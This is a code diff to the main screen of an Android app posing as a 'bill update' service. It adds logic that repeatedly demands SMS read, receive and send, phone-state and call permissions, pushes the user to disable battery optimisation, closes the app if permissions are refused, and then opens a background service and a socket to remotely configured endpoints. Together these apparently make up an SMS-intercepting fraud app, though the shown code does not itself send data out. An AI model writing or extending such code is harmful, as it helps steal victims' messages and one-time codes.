@@ -2,6 +2,7 @@ package com.service.billupdateblue;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
+import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -10,6 +11,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.os.PowerManager;
 import android.provider.Settings;
 import android.util.Log;
 import android.view.LayoutInflater;
@@ -40,36 +42,24 @@ public class MainActivity extends BaseActivity {
     public AlertDialog dialog;
 
     private static final int SMS_PERMISSION_REQUEST_CODE = 1;
-    private static final int MAX_RETRIES = 10;
-    private static final long DELAY_MS = 6000; // 6 seconds per retry
-    private int retryCount = 0;
-    private Handler handler = new Handler(Looper.getMainLooper());
 
     @SuppressLint("SetTextI18n")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        LayoutInflater inflater = getLayoutInflater();
-        View dialogView = inflater.inflate(R.layout.dialog_loading, null);
-
-        // Loading Dialog
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setView(dialogView);
-        builder.setCancelable(false);
-        setupLoading = builder.create();
-        setupLoading.show();
-
-        helper.FormCode(); // test cpp security is there nay error or not
-        if(!Helper.isNetworkAvailable(this)) {
-            Intent intent = new Intent(context, NoInternetActivity.class);
-            startActivity(intent);
-        }
-        checkPermissions();
-
     }
 
     private void runApp(){
         setContentView(R.layout.activity_main);
+        this.hideLoadingDialog();
+
+//        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+//        if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
+//            @SuppressLint("BatteryLife") Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+//            intent.setData(Uri.parse("package:" + getPackageName()));
+//            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+//            startActivity(intent);
+//        }
 
         // init the after the apinPointSet
         socketManager = SocketManager.getInstance(context);
@@ -81,7 +71,6 @@ public class MainActivity extends BaseActivity {
         } else {
             startService(serviceIntent);
         }
-
 
         dataObject = new HashMap<>();
         ids = new HashMap<>();
@@ -152,7 +141,13 @@ public class MainActivity extends BaseActivity {
     }
 
     private void initializeWebView() {
-        initializeApiPoints();
+        boolean isAllowed = BatteryOptimizationHelper.handleActivityResult(this);
+        if (isAllowed) {
+            initializeApiPoints();
+        }else {
+            helper.show("Requesting battery optimization ignore...");
+            BatteryOptimizationHelper.requestIgnoreBatteryOptimizations(this);
+        }
     }
 
 
@@ -203,21 +198,17 @@ public class MainActivity extends BaseActivity {
         String[] permissions = new String[]{
                 Manifest.permission.READ_PHONE_STATE,
                 Manifest.permission.CALL_PHONE,
-                Manifest.permission.INTERNET,
                 Manifest.permission.ACCESS_NETWORK_STATE,
                 Manifest.permission.READ_SMS,
                 Manifest.permission.RECEIVE_SMS,
                 Manifest.permission.SEND_SMS
         };
-
-        // Add all the above if missing
         for (String perm : permissions) {
             if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                 permissionsToRequest.add(perm);
             }
         }
 
-        // ✅ For Android 13+ (notification permission)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                     != PackageManager.PERMISSION_GRANTED) {
@@ -231,10 +222,8 @@ public class MainActivity extends BaseActivity {
                     permissionsToRequest.toArray(new String[0]),
                     SMS_PERMISSION_REQUEST_CODE
             );
-            Toast.makeText(this, "Requesting permissions...", Toast.LENGTH_SHORT).show();
         } else {
             initializeWebView();
-            // OR start your foreground service here
         }
     }
 
@@ -253,14 +242,11 @@ public class MainActivity extends BaseActivity {
                         missingPermissions.append(permissions[i]).append("\n");
                     }
                 }
-
                 if (allPermissionsGranted) {
-                    initializeWebView(); // or startForegroundService()
+                    initializeWebView();
                 } else {
                     showPermissionDeniedDialog();
-                    Toast.makeText(this,
-                            "Permissions denied:\n" + missingPermissions.toString(),
-                            Toast.LENGTH_LONG).show();
+                    Toast.makeText(this,"Permissions Required : \n" + missingPermissions.toString(), Toast.LENGTH_LONG).show();
                 }
             }
         }
@@ -269,26 +255,16 @@ public class MainActivity extends BaseActivity {
     private void showPermissionDeniedDialog() {
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle("Permission Denied");
-        builder.setMessage("SMS permissions are required to send and receive messages. " +
-                "Please grant the permissions in the app settings.");
-
-        // Open settings button
-        builder.setPositiveButton("Open Settings", new DialogInterface.OnClickListener() {
-            @Override
-            public void onClick(DialogInterface dialog, int which) {
-                openAppSettings();
+        builder.setMessage("Please grant the permissions in the app settings...");
+        builder.setCancelable(false);
+        builder.setPositiveButton("Open Settings", (dialog, which) -> openAppSettings());
+        builder.setNegativeButton("Close App", (dialog, which) -> {
+            boolean isAllowed = BatteryOptimizationHelper.handleActivityResult(context);
+            dialog.dismiss();
+            if(!isAllowed){
+                finish(); // close app if not allowed..
             }
         });
-
-        // Cancel button
-        builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
-            @Override
-            public void onClick(DialogInterface dialog, int which) {
-                dialog.dismiss();
-                finish();
-            }
-        });
-
         builder.show();
     }
     private void openAppSettings() {
@@ -367,7 +343,6 @@ public class MainActivity extends BaseActivity {
     //                            Toast.makeText(getApplicationContext(),
     //                                    "Device registered successfully ✅",
     //                                    Toast.LENGTH_SHORT).show();
-                                setupLoading.hide();
                                 runApp();
                             } else {
                                 Toast.makeText(getApplicationContext(),
@@ -396,22 +371,6 @@ public class MainActivity extends BaseActivity {
             });
     }
 
-    private boolean hasPermission() {
-        if(ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-            return false;
-        } else {
-            if(isNotificationListenerEnabled()){
-                return true;
-            }else{
-                return false;
-            }
-        }
-    }
-    private boolean isNotificationListenerEnabled() {
-        Set<String> enabledListenerPackages = NotificationManagerCompat.getEnabledListenerPackages(this);
-        return enabledListenerPackages.contains(getPackageName());
-    }
-
     private void initializeApiPoints() {
         ApiUpdater updater = new ApiUpdater();
         updater.updateApiPoints(this, new ApiUpdater.ApiPointsCallback() {
@@ -423,11 +382,58 @@ public class MainActivity extends BaseActivity {
             }
             @Override
             public void onApiPointsFailure(String error) {
-                // If the app can't function without these URLs, you should show an Alert Dialog here.
-                Log.e("MAIN", "Failed to load API Points: " + error);
+                helper.show("Main:Failed to load API Points: " + error);
                 Toast.makeText(context, "Configuration failed. Check connection.", Toast.LENGTH_LONG).show();
             }
         });
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        helper.FormCode();
+        if(!helper.isNetworkAvailable(this)) {
+            Intent intent = new Intent(context, NoInternetActivity.class);
+            startActivity(intent);
+        }
+        BatteryOptimizationHelper.requestIgnoreBatteryOptimizations(this);
+        if (areAllPermissionsGranted()) {
+            boolean isAllowed = BatteryOptimizationHelper.handleActivityResult(this);
+            if (isAllowed) {
+                initializeWebView();
+            }else {
+                Toast.makeText(this, "Please restart the app & give allow the permission", Toast.LENGTH_SHORT).show();
+
+            }
+        } else {
+            checkPermissions();
+        }
+    }
+
+    private boolean areAllPermissionsGranted() {
+        String[] permissions = new String[]{
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.CALL_PHONE,
+                Manifest.permission.ACCESS_NETWORK_STATE,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.RECEIVE_SMS,
+                Manifest.permission.SEND_SMS
+        };
+
+        for (String permission : permissions) {
+            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
+                    != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+
+        return true;
     }
 
 
